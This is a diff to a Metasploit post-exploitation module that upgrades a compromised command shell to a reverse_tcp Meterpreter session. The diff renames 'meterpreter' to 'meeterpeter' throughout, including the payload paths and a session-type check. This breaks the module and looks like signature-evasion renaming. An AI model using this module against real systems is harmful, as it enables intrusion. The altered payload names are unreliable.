@@ -14,12 +14,12 @@ class Metasploit3 < Msf::Post
 
   def initialize(info = {})
     super(update_info(info,
-        'Name'          => 'Shell to Meterpreter Upgrade',
+        'Name'          => 'Shell to meeterpeter Upgrade',
         'Description'   => %q{
-          This module attempts to upgrade a command shell to meterpreter. The shell
-          platform is automatically detected and the best version of meterpreter for
-          the target is selected. Currently meterpreter/reverse_tcp is used on Windows
-          and Linux, with 'python/meterpreter/reverse_tcp' used on all others.
+          This module attempts to upgrade a command shell to meeterpeter. The shell
+          platform is automatically detected and the best version of meeterpeter for
+          the target is selected. Currently meeterpeter/reverse_tcp is used on Windows
+          and Linux, with 'python/meeterpeter/reverse_tcp' used on all others.
         },
         'License'       => MSF_LICENSE,
         'Author'        => ['Tom Sellers <tom [at] fadedcode.net>'],
@@ -41,7 +41,7 @@ class Metasploit3 < Msf::Post
       OptEnum.new('WIN_TRANSFER',
         [true, 'Which method to try first to transfer files on a Windows target.', 'POWERSHELL', ['POWERSHELL', 'VBS']]),
       OptString.new('PAYLOAD_OVERRIDE',
-        [false, 'Define the payload to use (meterpreter/reverse_tcp by default) .', nil])
+        [false, 'Define the payload to use (meeterpeter/reverse_tcp by default) .', nil])
     ], self.class)
     deregister_options('PERSIST', 'PSH_OLD_METHOD', 'RUN_WOW64')
   end
@@ -50,8 +50,8 @@ class Metasploit3 < Msf::Post
   def run
     print_status("Upgrading session ID: #{datastore['SESSION']}")
 
-    if session.type =~ /meterpreter/
-      print_error("Shell is already Meterpreter.")
+    if session.type =~ /meeterpeter/
+      print_error("Shell is already meeterpeter.")
       return nil
     end
 
@@ -74,18 +74,18 @@ class Metasploit3 < Msf::Post
     case session.platform
     when /win/i
       platform = 'win'
-      payload_name = 'windows/meterpreter/reverse_tcp'
+      payload_name = 'windows/meeterpeter/reverse_tcp'
       lplat = [Msf::Platform::Windows]
       larch = [ARCH_X86]
       psh_arch = 'x86'
       vprint_status("Platform: Windows")
     when /osx/i
       platform = 'python'
-      payload_name = 'python/meterpreter/reverse_tcp'
+      payload_name = 'python/meeterpeter/reverse_tcp'
       vprint_status("Platform: OS X")
     when /solaris/i
       platform = 'python'
-      payload_name = 'python/meterpreter/reverse_tcp'
+      payload_name = 'python/meeterpeter/reverse_tcp'
       vprint_status("Platform: Solaris")
     else
       # Find the best fit, be specific with uname to avoid matching hostname or something else
@@ -93,14 +93,14 @@ class Metasploit3 < Msf::Post
       if target_info =~ /linux/i && target_info =~ /86/
         # Handle linux shells that were identified as 'unix'
         platform = 'linux'
-        payload_name = 'linux/x86/meterpreter/reverse_tcp'
+        payload_name = 'linux/x86/meeterpeter/reverse_tcp'
         lplat = [Msf::Platform::Linux]
         larch = [ARCH_X86]
         vprint_status("Platform: Linux")
       elsif cmd_exec('python -V') =~ /Python (2|3)\.(\d)/
         # Generic fallback for OSX, Solaris, Linux/ARM
         platform = 'python'
-        payload_name = 'python/meterpreter/reverse_tcp'
+        payload_name = 'python/meeterpeter/reverse_tcp'
         vprint_status("Platform: Python [fallback]")
       end
     end
@@ -108,7 +108,7 @@ class Metasploit3 < Msf::Post
     vprint_status("Upgrade payload: #{payload_name}")
 
     if platform.blank?
-      print_error("Shells on the the target platform, #{session.platform}, cannot be upgraded to Meterpreter at this time.")
+      print_error("Shells on the the target platform, #{session.platform}, cannot be upgraded to meeterpeter at this time.")
       return nil
     end
 
@@ -227,7 +227,7 @@ class Metasploit3 < Msf::Post
   def cleanup_handler(listener_job_id, aborted)
     # Return if the job has already finished
     return nil if framework.jobs[listener_job_id].nil?
-    framework.threads.spawn('ShellToMeterpreterUpgradeCleanup', false) {
+    framework.threads.spawn('ShellTomeeterpeterUpgradeCleanup', false) {
       if !aborted
         timer = 0
         vprint_status("Waiting up to #{HANDLE_TIMEOUT} seconds for the session to come back")
